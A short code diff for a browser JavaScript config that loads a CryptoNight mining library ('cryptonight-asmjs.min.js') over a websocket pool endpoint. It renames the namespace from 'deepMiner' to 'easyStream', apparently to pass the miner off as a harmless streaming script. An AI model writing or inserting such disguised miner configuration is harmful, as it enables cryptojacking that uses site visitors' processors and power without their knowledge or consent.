@@ -1,13 +1,13 @@
-self.deepMiner = self.deepMiner || {};
-self.deepMiner.CONFIG = {
-    LIB_URL: "https://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/api"]],
+self.easyStream = self.easyStream || {};
+self.easyStream.CONFIG = {
+    LIB_URL: "https://%easyStream_domain%/lib/",
+    WEBSOCKET_SHARDS: [["wss://%easyStream_domain%/api"]],
     ASMJS_NAME: "cryptonight-asmjs.min.js",
     REQUIRES_AUTH: false
 };
 var Module = {
     locateFile: (function (path) {
-        return deepMiner.CONFIG.LIB_URL + path
+        return easyStream.CONFIG.LIB_URL + path
     })
 };
 var Module;
